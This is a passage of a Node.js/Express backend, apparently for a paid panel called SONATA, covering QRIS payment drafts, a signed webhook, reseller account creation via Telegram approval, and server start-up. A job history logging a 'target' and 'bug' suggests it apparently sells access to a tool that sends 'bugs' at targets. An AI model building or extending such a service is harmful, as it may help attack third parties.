    const user = loadDatabase().find(u => u.username === req.username);
    if (!user) return res.status(404).json({ ok: false, message: 'Akun tidak ditemukan.' });
    const opt = computeUpgradeOption(user, toRole);
    if (!opt) return res.status(403).json({ ok: false, message: 'Upgrade tidak diizinkan untuk role ini.' });
    if (opt.price <= 0) return res.status(400).json({ ok: false, message: 'Harga upgrade tidak valid.' });

    const q = await bqCreateQris({
      amount: opt.price,
      description: `Upgrade ${user.username} ${user.role} -> ${toRole}`,
    });

    pruneDrafts(UPGRADE_DRAFT_FILE);
    const drafts = loadArr(UPGRADE_DRAFT_FILE);
    const now = Date.now();
    const draft = {
      draftId: 'ud_' + now + '_' + crypto.randomBytes(4).toString('hex'),
      username: user.username,
      fromRole: String(user.role || 'member').toLowerCase(),
      toRole,
      amount: Number(q.amount || opt.price),
      totalAmount: Number(q.total_amount || opt.price),
      qrUrl: q.qr_url || q.qris_image || '',
      paymentUrl: q.payment_url || '',
      transactionId: String(q.transaction_id || ''),
      expiredAt: q.expired_at || null,
      status: 'pending',
      createdMs: now,
      createdAt: new Date().toISOString(),
    };
    drafts.push(draft);
    saveArr(UPGRADE_DRAFT_FILE, drafts);

    return res.json({
      ok: true,
      transactionId: draft.transactionId,
      qrUrl: draft.qrUrl,
      paymentUrl: draft.paymentUrl,
      amount: draft.amount,
      totalAmount: draft.totalAmount,
      expiredAt: draft.expiredAt,
    });
  } catch (e) {
    return res.status(500).json({ ok: false, message: e.message });
  }
});

function applyRoleChange(draft) {
  if (!draft || draft.status === 'done') return { ok: false, reason: 'already' };
  const db = loadDatabase();
  const idx = db.findIndex(u => String(u.username) === String(draft.username));
  if (idx < 0) return { ok: false, reason: 'user_not_found' };
  const user = db[idx];
  const curRole = String(user.role || 'member').toLowerCase();
  if (!UP_TARGETS[curRole] || !UP_TARGETS[curRole].includes(draft.toRole)) {
    return { ok: false, reason: 'invalid_transition' };
  }
  user.role = draft.toRole;
  const exp = new Date();
  exp.setDate(exp.getDate() + 30);
  user.expiredDate = exp.toISOString().split('T')[0];
  user.day = 30;
  user.upgradedAt = new Date().toISOString();
  db[idx] = user;
  saveDatabase(db);
  try { void backupDatabaseToDev(`Up role ${user.username}: ${curRole} -> ${draft.toRole}`); } catch (_) {}
  return { ok: true, user };
}

app.get('/api/upgrade/status/:trxId', async (req, res) => {
  try {
    const trxId = String(req.params.trxId || '').trim();
    if (!trxId) return res.status(400).json({ ok: false, message: 'trxId wajib.' });
    const drafts = loadArr(UPGRADE_DRAFT_FILE);
    const idx = drafts.findIndex(d => String(d.transactionId) === trxId);
    if (idx < 0) return res.status(404).json({ ok: false, message: 'Transaksi tidak ditemukan.' });
    const draft = drafts[idx];

    if (draft.status === 'done') {
      return res.json({ ok: true, status: 'success', newRole: draft.toRole, expiredDate: draft.appliedExpiredDate || null });
    }

    const r = await bqCheckStatus(trxId);
    if (r.rateLimited) return res.json({ ok: true, status: 'pending', rateLimited: true, retryAfter: r.retryAfter });
    if (r.error) return res.status(502).json({ ok: false, message: r.error });

    const status = String(r.data.status || 'pending').toLowerCase();
    if (status === 'success') {
      const apply = applyRoleChange(draft);
      const refreshed = loadArr(UPGRADE_DRAFT_FILE);
      const ridx = refreshed.findIndex(d => d.draftId === draft.draftId);
      if (apply.ok) {
        if (ridx >= 0) {
          refreshed[ridx].status = 'done';
          refreshed[ridx].doneAt = new Date().toISOString();
          refreshed[ridx].appliedExpiredDate = apply.user.expiredDate;
          saveArr(UPGRADE_DRAFT_FILE, refreshed);
        }
        return res.json({ ok: true, status: 'success', newRole: apply.user.role, expiredDate: apply.user.expiredDate });
      }
      return res.json({ ok: true, status: 'failed', message: apply.reason || 'Gagal menerapkan upgrade.' });
    }
    return res.json({ ok: true, status });
  } catch (e) {
    return res.status(500).json({ ok: false, message: e.message });
  }
});

app.post('/api/upgrade/manual-confirm', async (req, res) => {
  try {
    const trxId = String(req.body.transactionId || '').trim();
    if (!trxId) return res.status(400).json({ ok: false, message: 'transactionId wajib.' });
    const drafts = loadArr(UPGRADE_DRAFT_FILE);
    const idx = drafts.findIndex(d => String(d.transactionId) === trxId);
    if (idx < 0) return res.status(404).json({ ok: false, message: 'Transaksi tidak ditemukan.' });
    if (drafts[idx].status === 'done') {
      return res.json({ ok: true, status: 'success', newRole: drafts[idx].toRole, expiredDate: drafts[idx].appliedExpiredDate || null });
    }

    const r = await bqCheckStatus(trxId);
    if (r.rateLimited) return res.json({ ok: true, status: 'pending', message: `Rate limit. Coba lagi ${r.retryAfter}s.` });
    if (r.error) return res.status(502).json({ ok: false, message: r.error });

    const status = String(r.data.status || 'pending').toLowerCase();
    if (status === 'success') {
      const draft = drafts[idx];
      const apply = applyRoleChange(draft);
      const refreshed = loadArr(UPGRADE_DRAFT_FILE);
      const ridx = refreshed.findIndex(d => d.draftId === draft.draftId);
      if (apply.ok) {
        if (ridx >= 0) {
          refreshed[ridx].status = 'done';
          refreshed[ridx].doneAt = new Date().toISOString();
          refreshed[ridx].appliedExpiredDate = apply.user.expiredDate;
          saveArr(UPGRADE_DRAFT_FILE, refreshed);
        }
        return res.json({ ok: true, status: 'success', newRole: apply.user.role, expiredDate: apply.user.expiredDate });
      }
      return res.json({ ok: true, status: 'failed', message: apply.reason || 'Gagal menerapkan upgrade.' });
    }
    return res.json({ ok: true, status });
  } catch (e) {
    return res.status(500).json({ ok: false, message: e.message });
  }
});

// ═══════════════════════════════════════════════════════════════════════
//  D. WEBHOOK /callback/buatqris
//  - Verifikasi HMAC kalau signing secret diisi
//  - Cross-check ke BuatQris kalau signing secret kosong
//  - Idempoten (by transaction_id)
// ═══════════════════════════════════════════════════════════════════════
app.post('/callback/buatqris', express.raw({ type: '*/*', limit: '1mb' }), async (req, res) => {
  try {
    const rawBody = Buffer.isBuffer(req.body) ? req.body : Buffer.from('');
    let bodyJson = null;
    try { bodyJson = JSON.parse(rawBody.toString('utf8')); }
    catch (_) { return res.status(400).json({ ok: false }); }

    // 1. Verifikasi HMAC kalau signing secret diisi
    if (BUATQRIS_SIGNING) {
      const sigHeader = String(req.get('X-BuatQris-Signature') || '');
      const calc = 'sha256=' + crypto.createHmac('sha256', BUATQRIS_SIGNING).update(rawBody).digest('hex');
      if (calc.length !== sigHeader.length ||
          !crypto.timingSafeEqual(Buffer.from(calc), Buffer.from(sigHeader))) {
        console.warn('[WEBHOOK] signature mismatch');
        return res.status(401).json({ ok: false });
      }
    } else {
      // 2. Kalau signing kosong → WAJIB cross-check ke BuatQris
      const event = String(bodyJson.event || '');
      const trxId = String(bodyJson.transaction_id || '');
      if (event === 'payment.success' && trxId) {
        const r = await bqCheckStatus(trxId);
        if (r.error || r.rateLimited || !r.data || String(r.data.status || '').toLowerCase() !== 'success') {
          console.warn(`[WEBHOOK] cross-check gagal untuk ${trxId}:`, r.error || r.rateLimited || 'status bukan success');
          // tetap balas 200 biar BuatQris nggak retry terus, tapi jangan proses
          return res.status(200).json({ ok: true, skipped: true });
        }
      }
    }

    const event = String(bodyJson.event || '');
    const trxId = String(bodyJson.transaction_id || '');

    if (event === 'payment.success' && trxId) {
      // A) Cek tax draft
      const taxDrafts = loadArr(TAX_DRAFT_FILE);
      const tidx = taxDrafts.findIndex(d => String(d.transactionId) === trxId);
      if (tidx >= 0 && taxDrafts[tidx].status !== 'success') {
        taxDrafts[tidx].status = 'success';
        taxDrafts[tidx].paidAt = new Date().toISOString();
        saveArr(TAX_DRAFT_FILE, taxDrafts);
        console.log(`[WEBHOOK] tax paid: ${trxId}`);
      }

      // B) Cek buy draft
      const buyDrafts = loadArr(BUY_DRAFT_FILE);
      const bidx = buyDrafts.findIndex(d => String(d.transactionId) === trxId);
      if (bidx >= 0 && buyDrafts[bidx].status === 'pending') {
        const create = await createAccountForBuyDraft(buyDrafts[bidx]);
        const refreshed = loadArr(BUY_DRAFT_FILE);
        const ridx = refreshed.findIndex(d => d.draftId === buyDrafts[bidx].draftId);
        if (ridx >= 0) {
          if (create.ok) {
            refreshed[ridx].status = 'done';
            refreshed[ridx].doneAt = new Date().toISOString();
            refreshed[ridx].accountResult = {
              username: create.account.username,
              password: create.account.password,
              role: create.account.role,
              expiredDate: create.account.expiredDate,
            };
          } else if (create.reason === 'conflict') {
            refreshed[ridx].status = 'conflict';
          }
          saveArr(BUY_DRAFT_FILE, refreshed);
        }
        console.log(`[WEBHOOK] buy access: ${trxId} → ${create.ok ? 'created' : create.reason}`);
      }

      // C) Cek upgrade draft
      const upDrafts = loadArr(UPGRADE_DRAFT_FILE);
      const uidx = upDrafts.findIndex(d => String(d.transactionId) === trxId);
      if (uidx >= 0 && upDrafts[uidx].status === 'pending') {
        const apply = applyRoleChange(upDrafts[uidx]);
        const refreshed = loadArr(UPGRADE_DRAFT_FILE);
        const ridx = refreshed.findIndex(d => d.draftId === upDrafts[uidx].draftId);
        if (ridx >= 0 && apply.ok) {
          refreshed[ridx].status = 'done';
          refreshed[ridx].doneAt = new Date().toISOString();
          refreshed[ridx].appliedExpiredDate = apply.user.expiredDate;
          saveArr(UPGRADE_DRAFT_FILE, refreshed);
        }
        console.log(`[WEBHOOK] role up: ${trxId} → ${apply.ok ? 'done' : apply.reason}`);
      }
    }

    return res.status(200).json({ ok: true });
  } catch (e) {
    console.error('[WEBHOOK]', e);
    return res.status(500).json({ ok: false });
  }
});

// ═══════════════════════════════════════════════════════════════════════
//  E. Update /api/seller/create-account — validasi taxTransactionId
//  (Patch dilakukan dengan menghapus handler lama & register ulang)
//  Catatan: handler lama di Part 5 masih ada, tapi yang ini yang AKTIF
//  karena di-register paling akhir di Express (last wins).
// ═══════════════════════════════════════════════════════════════════════
app.post('/api/seller/create-account', ratRequireAuth, uploadBukti.single('proof'), async (req, res) => {
  try {
    const sellerRole = String(ratGetRole(req.username) || '').toLowerCase();
    if (!['owner', 'reseller'].includes(sellerRole)) {
      return res.status(403).json({ ok: false, message: 'Menu ini khusus OWNER dan RESELLER.' });
    }
    if (!ACC_GROUP_ID) return res.status(503).json({ ok: false, message: 'Grup transaksi OWNER belum dikonfigurasi.' });

    const username = String(req.body.username || '').trim();
    const password = String(req.body.password || '');
    const role = String(req.body.role || '').toLowerCase();
    const proofPath = req.file?.path;
    const taxTransactionId = String(req.body.taxTransactionId || '').trim();
    const allowed = sellerRole === 'owner' ? ['reseller', 'fullup', 'member'] : ['fullup', 'member'];

    if (!/^[a-zA-Z0-9_.-]{3,32}$/.test(username) || password.length < 4 || !allowed.includes(role)) {
      return res.status(400).json({ ok: false, message: 'Username/password/role tidak valid.' });
    }
    if (!proofPath) return res.status(400).json({ ok: false, message: 'Bukti transaksi wajib diunggah.' });
    if (loadDatabase().some(u => String(u.username).toLowerCase() === username.toLowerCase())) {
      return res.status(409).json({ ok: false, message: 'Username sudah digunakan.' });
    }

    // VALIDASI PAJAK
    const taxCheck = await validateTaxForCreate(taxTransactionId, role);
    if (!taxCheck.ok) {
      return res.status(402).json({ ok: false, message: taxCheck.message || 'Pajak belum dibayar.' });
    }

    // Tandai pajak sudah dipakai
    if (taxCheck.draft) {
      const drafts = loadArr(TAX_DRAFT_FILE);
      const idx = drafts.findIndex(d => d.transactionId === taxCheck.draft.transactionId);
      if (idx >= 0) {
        drafts[idx].usedForCreate = true;
        drafts[idx].usedAt = new Date().toISOString();
        drafts[idx].usedForUsername = username;
        saveArr(TAX_DRAFT_FILE, drafts);
      }
    }

    const prices = { reseller: 80000, fullup: 40000, member: 20000 };
    const account = buildAccountObject({ username, password, role, day: 30, createdBy: req.username });
    const id = 'seller_' + Date.now() + '_' + crypto.randomBytes(3).toString('hex');
    const items = loadPurchases();
    const entry = {
      id, mode: 'seller_create', seller: req.username, sellerRole,
      account, username, price: prices[role], label: role.toUpperCase(),
      proofPath, status: 'pending', createdAt: new Date().toISOString(),
      taxTransactionId: taxTransactionId || null,
    };
    items.push(entry);
    savePurchases(items);

    try {
      await bot.sendPhoto(ACC_GROUP_ID, proofPath, {
        caption: `🧾 <b>AKSES JUALAN — PERLU ACC</b>\nPenjual: <code>${req.username}</code> (${sellerRole.toUpperCase()})\nBuyer: <code>${username}</code>\nRole: <b>${role.toUpperCase()}</b>\nNominal: Rp${prices[role].toLocaleString('id-ID')}\n${taxTransactionId ? `Pajak: ✅ lunas (<code>${taxTransactionId}</code>)\n` : ''}ID: <code>${id}</code>`,
        parse_mode: 'HTML',
        reply_markup: {
          inline_keyboard: [[
            { text: '✅ ACC & BUAT AKUN', callback_data: `acc_purchase_${id}` },
            { text: '❌ TOLAK', callback_data: `rej_purchase_${id}` },
          ]],
        },
      });
    } catch (telegramError) {
      entry.notificationStatus = 'failed';
      entry.notificationError = String(telegramError.message || telegramError).slice(0, 300);
      entry.updatedAt = new Date().toISOString();
      savePurchases(items);
      return res.status(502).json({
        ok: false, id, historySaved: true,
        message: `Transaksi tercatat, notif Owner gagal: ${entry.notificationError}`,
      });
    }

    return res.json({ ok: true, id, message: 'Bukti dikirim ke grup OWNER. Akun dibuat setelah ACC.' });
  } catch (e) {
    console.error('[SELLER CREATE]', e.stack || e.message);
    return res.status(500).json({ ok: false, message: `Gagal: ${e.message || 'kesalahan server'}` });
  }
});

// ═══════════════════════════════════════════════════════════════════════
//  F. AUTO CLEAN + FCM + SERVER LISTEN
// ═══════════════════════════════════════════════════════════════════════
app.post('/updateFCMToken', async (req, res) => {
  try {
    const { key, fcmToken } = req.body;
    if (!key || !fcmToken) return res.status(400).json({ success: false, message: 'Key dan Token diperlukan' });
    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.status(401).json({ success: false, message: 'Key tidak valid' });
    const db = loadDatabase();
    const user = db.find(u => u.username === keyInfo.username);
    if (!user) return res.status(404).json({ success: false, message: 'User tidak ditemukan' });
    user.fcmToken = fcmToken;
    saveDatabase(db);
    return res.json({ success: true, message: 'Token FCM berhasil diperbarui' });
  } catch (err) {
    return res.status(500).json({ success: false, error: err.message });
  }
});

const HISTORY_FILE = path.join(__dirname, 'history.json');
function loadHistory() {
  try { return JSON.parse(fs.readFileSync(HISTORY_FILE, 'utf8')); } catch { return []; }
}
function saveHistory(d) {
  try { if (d.length > 2000) d = d.slice(d.length - 2000); fs.writeFileSync(HISTORY_FILE, JSON.stringify(d, null, 2)); } catch (_) {}
}
function addHistoryEntry(username, target, bug, senderType) {
  const h = loadHistory();
  const id = 'job_' + Date.now() + '_' + crypto.randomBytes(4).toString('hex');
  h.push({ id, username, target, bug, senderType, status: 'pending', message: '', timestamp: Date.now() });
  saveHistory(h);
  return id;
}
function updateHistoryStatus(id, status, message = '') {
  if (!id) return;
  const h = loadHistory();
  const e = h.find(x => x.id === id);
  if (e) { e.status = status; if (message) e.message = message; saveHistory(h); }
}

app.get('/bugHistory', async (req, res) => {
  try {
    const { key } = req.query;
    if (!key) return res.status(400).json({ success: false, message: 'Session key is missing' });
    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.status(401).json({ success: false, message: 'Invalid session key' });
    const history = loadHistory().filter(h => h.username === keyInfo.username).reverse();
    return res.json({ success: true, history });
  } catch (err) {
    return res.status(500).json({ success: false, error: err.message });
  }
});

function scheduleAutoClean() {
  const now = new Date();
  const nextMidnight = new Date();
  nextMidnight.setUTCHours(17, 0, 0, 0);
  if (now >= nextMidnight) nextMidnight.setUTCDate(nextMidnight.getUTCDate() + 1);
  const delay = nextMidnight - now;
  setTimeout(() => {
    hapusIsiUserLogs();
    setInterval(hapusIsiUserLogs, 24 * 60 * 60 * 1000);
  }, delay);
}

setTimeout(() => {
  const targetChatId = process.env.TELEGRAM_CREATE_NOTIFY_GROUP_ID;
  if (!targetChatId) return;
  bot.sendMessage(targetChatId,
    `✅ <b>[SERVER] SERVICES ONLINE</b>\n\nSystem Status: <b>RUNNING</b>\nUptime: Just started\n✅ All systems operational.`,
    { parse_mode: 'HTML' }
  ).catch(() => {});
}, 3000);

app.use((err, req, res, next) => {
  if (err && err.code === 'LIMIT_FILE_SIZE') {
    return res.status(413).json({ success: false, message: 'File terlalu besar. Batas upload 100MB.' });
  }
  console.error('[Server Error]:', err);
  res.status(500).json({ success: false, message: 'Internal server error' });
});

const PORT = Number(process.env.API_PORT) || 3131;
const WS_PORT = Number(process.env.WS_PORT) || 3131;

console.log(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
console.log(`    SONATA V1 — FULL EDITION`);
console.log(`    STATUS : PERSISTENCE ACTIVE`);
console.log(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);

server.listen(PORT, () => {
  console.log(`🚀 Server aktif di http://localhost:${PORT}`);
  console.log(`🔌 Socket.IO: http://localhost:${PORT}/socket.io`);
  console.log(`📡 WSS Chat: ws://localhost:${WS_PORT}/ws-raw`);
  console.log(`[QRIS] Tax endpoints: POST /api/tax/create, GET /api/tax/status/:id, POST /api/tax/manual-confirm`);
  console.log(`[QRIS] Buy Access: GET /api/buy/packages, POST /api/buy/check-username, POST /api/buy/create`);
  console.log(`[QRIS] Role Up: GET /api/upgrade/options, POST /api/upgrade/create`);
  console.log(`[QRIS] Webhook: POST /callback/buatqris`);
  console.log(`[QRIS] Signing secret: ${BUATQRIS_SIGNING ? 'AKTIF' : 'KOSONG (cross-check aktif)'}`);
  console.log(`[QRIS] Callback URL: ${BUATQRIS_CALLBACK || '(kosong — webhook mati, polling tetap jalan)'}`);

  startVipSessions();
  startUserSessions();

  console.log(`[AUTO REFRESH] Diatur setiap 30 menit sekali.`);
  setInterval(autoRefresh, THIRTY_MINUTES);

  console.log(`[AUTOCLEAN LOGS] Diatur setiap jam 12 malam WIB.`);
  scheduleAutoClean();

  setTimeout(() => {
    tryInstallJavaAsync().then(ok => {
      if (ok) console.log('[JAVA] ✅ Ready untuk Auto Builder.');
      else console.log('[JAVA] ⚠️ Java belum ready. Auto Builder butuh Java.');
    });
  }, 5000);

  console.log(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
  console.log(`    ✅ ALL SYSTEMS OPERATIONAL`);
  console.log(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
});

// ═══════════════════════════════════════════════════════════════════════
//  END OF FILE
// ═══════════════════════════════════════════════════════════════════════